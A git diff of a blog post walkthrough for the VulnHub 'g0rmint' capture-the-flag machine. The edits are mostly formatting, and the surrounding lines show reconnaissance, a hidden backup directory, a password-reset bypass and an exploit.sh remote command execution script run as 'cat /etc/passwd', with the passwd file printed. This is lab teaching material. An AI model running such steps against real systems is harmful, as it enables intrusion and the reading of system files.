@@ -1,6 +1,6 @@
 ---
 layout: post
-title: "Will the real Gormint Aunty please stand up?"
+title: "Will the Real Gormint Aunty Please Stand Up?"
 comments: true
 category: walkthrough
 tags: [vulnhub, g0rmint]
@@ -21,7 +21,9 @@ The Gormint Aunty is a social media sensation made famous by her "_yeh bik gai h
 Let's kick this off with a `nmap` scan to establish the services available in the host.
 
 ```
-# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.198.130`
+# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.198.130
+```
+```
 ...
 PORT   STATE SERVICE REASON         VERSION
 22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
@@ -72,7 +74,7 @@ Among the PHP pages, we can disregard those that returned **302** (because they 
 
 Let's explore each page in turn in reverse order starting with `/reset.php`.
 
-### Password Reset Page `/reset.php`
+### Password Reset Page
 
 Well, the page looked like your normal password reset page. If you know the email address and the username, you'll be able to reset the password.
 
@@ -80,7 +82,7 @@ Well, the page looked like your normal password reset page. If you know the emai
 
 At this point in time, I'm not aware of any email address or username. :sob:
 
-### Menu Page `/mainmenu.php`
+### Main Menu
 
 This page appeared interesting on the surface but it was the HTML source code that offered a clue on how to proceed.
 
@@ -92,7 +94,7 @@ Here's the source code. Noticed that `/secretlogfile.php` was commented out?
 
 Navigating to the page got me redirected back to `/login.php`. No luck there. However, it gave me the idea to look at the HTML source code closer for further hints.
 
-### Login Page `/login.php`
+### Login Page
 
 Indeed, if you look very closely at the HTML source code of `/login.php`, there was something that stood out.
 
@@ -100,7 +102,7 @@ Indeed, if you look very closely at the HTML source code of `/login.php`, there 
 
 A secret backup directory??!!
 
-### Header Page `/header.php`
+### Header
 
 This page appeared to contain the headers of the admin portal. The admin's full name was also hardcoded at the dropdown menu - **Noman Riffat.**
 
@@ -132,18 +134,20 @@ File found: /g0rmint/s3cretbackupdirect0ry/info.php - 200
 
 Good. One more page made available.
 
-### Information Page `/info.php`
+### Information Page
 
-This page proved to be an really informative one.
+This page proved to be an really informative one despite the lack of aesthetics. 
 
 ![info.php](/assets/images/posts/g0rmint-walkthrough/g0rmint-7.png)
 
-### Backup Archive `/backup.zip`
+### Backup Archive
 
 The backup archive can be downloaded at `/g0rmint/s3cretbackupdirect0ry/backup.zip`. Let's peek inside the file.
 
 ```
 # unzip -l backup.zip 
+```
+```
 Archive:  backup.zip
   Length      Date    Time    Name
 ---------  ---------- -----   ----
@@ -365,7 +369,7 @@ echo -n "$1" | sha1sum | cut -d' ' -f1 | cut -c1-20
 ```
 ![access](/assets/images/posts/g0rmint-walkthrough/g0rmint-13.png)
 
-The password reset worked. Awesome!
+The password reset worked!
 
 ### Remote Command Execution
 
@@ -450,6 +454,8 @@ Simply supply the email, password and command as arguments and the script would 
 
 ```
 # ./exploit.sh w3bdrill3r@gmail.com 30e1a63a8968b727f276 "cat /etc/passwd"
+```
+```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -481,7 +487,7 @@ mysql:x:108:117:MySQL Server,,,:/nonexistent:/bin/false
 sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
 ```
 
-### Backup Archive `/backup.zip` (2)
+### Backup Archive (2)
 
 During enumeration, I spotted the presence of another `backup.zip` at `/var/www`.
 
@@ -504,6 +510,8 @@ Next, I downloaded the file using `wget`.
 
 ```
 # wget http://192.168.198.130/backup.zip
+```
+```
 --2018-02-02 14:46:19-- http://192.168.198.130/backup.zip
 Connecting to 192.168.198.130:80... connected.
 HTTP request sent, awaiting response... 200 OK
